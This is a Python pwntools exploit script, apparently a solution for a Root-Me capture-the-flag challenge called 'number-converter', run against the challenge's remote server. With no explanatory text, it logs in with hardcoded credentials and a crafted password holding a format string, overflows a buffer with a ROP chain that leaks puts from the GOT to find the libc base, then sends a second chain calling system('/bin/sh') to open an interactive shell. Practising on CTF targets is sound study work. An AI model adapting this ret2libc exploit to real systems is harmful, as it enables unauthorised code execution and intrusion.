from pwn import *
p = remote("ctf10k.root-me.org", 5006)
#p = process("./number-converter")
elf = ELF("./number-converter", checksec = 0)
#libc = elf.libc
libc = ELF("./libc-2.31.so", checksec = 0)
ret = p64(0x000000000040101a)
rdi = p64(0x0000000000401583)
user = b"admin"
password = b"sup3rus3r"
password += b"\x00"
password += b"\x00" * 6
password += p64(0x4040d8) #password + 16
password += b"%s"
password += b"\x00" * 3

p.sendlineafter("login: ", user)
p.sendlineafter("password: ", password)
p.sendline("-1")
payload = b"A" * 24
payload += rdi
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym.main)
p.sendline(payload)
p.sendline(b"")
p.recvuntil("> ")
p.recvuntil("> ")
libc_leak = u64(p.recvline().strip(b"\n").ljust(8,b"\x00")) - libc.sym.puts
print(hex(libc_leak))
system = libc_leak + libc.sym.system
binsh = libc_leak + next(libc.search(b"/bin/sh\x00"))
print(hex(system))
print(hex(binsh))
p.sendlineafter("login: ",user)
p.sendlineafter("password: ", password)
p.sendline("-1")
payload = b"A" * 24 + rdi + p64(binsh)  + ret + p64(system + 4)
p.sendline(payload)
p.sendline("")
#gdb.attach(p)
p.interactive()
